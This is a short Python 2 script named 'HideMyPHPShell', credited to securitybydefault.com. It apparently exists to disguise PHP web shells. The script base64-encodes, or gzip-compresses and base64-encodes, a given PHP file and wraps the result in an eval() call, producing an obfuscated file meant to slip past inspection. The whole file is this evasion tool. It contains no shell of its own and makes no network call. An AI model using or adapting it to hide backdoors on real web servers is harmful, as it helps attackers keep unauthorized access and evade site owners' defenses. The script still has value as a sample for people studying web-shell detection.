#!/usr/bin/env python

# HideMyPHPShell
# a0rtega - securitybydefault.com
# GNU/GPLv3

import sys
import base64
import zlib
import random

def php_b64_enc(php):
	try:
		f = open(php, "r")
		content = f.read()
		f.close()
		payload = "base64_decode(\"%s\")" % (base64.b64encode("?>" + content))
		return payload
	except:
		print "Error opening %s" % (php)
		sys.exit()

def php_gzipb64_enc(php):
	try:
		f = open(php, "r")
		content = f.read()
		f.close()
		payload = "gzuncompress(base64_decode(\"%s\"))" % (base64.b64encode(zlib.compress("?>" + content, random.randrange(1, 9))))
		return payload
	except:
		print "Error opening %s" % (php)
		sys.exit()

def php_dump_exit(php, payload):
	try:
		f = open(php + ".obfuscated.php", "w")
		f.write("<?php eval(%s); ?>" % (payload))
		f.close()
	except:
		print "Error opening out file %s.obfuscated.php" % (php)
		sys.exit()

def main():
	if (len(sys.argv) != 3):
		print "HideMyPHPShell help"
		print "%s method_number php_file" % (sys.argv[0])
		print "1 eval() base64"
		print "2 eval() gzip + base64"
		sys.exit()

	random.seed()

	print "Obfuscating %s with method %s ..." % (sys.argv[2], sys.argv[1])

	if (sys.argv[1] == "1"):
		php_dump_exit(sys.argv[2], php_b64_enc(sys.argv[2]))
	elif (sys.argv[1] == "2"):
		php_dump_exit(sys.argv[2], php_gzipb64_enc(sys.argv[2]))
	else:
		print "Unknown method"
		sys.exit()

	print "Done, dumped to %s.obfuscated.php" % (sys.argv[2])

main() # Run
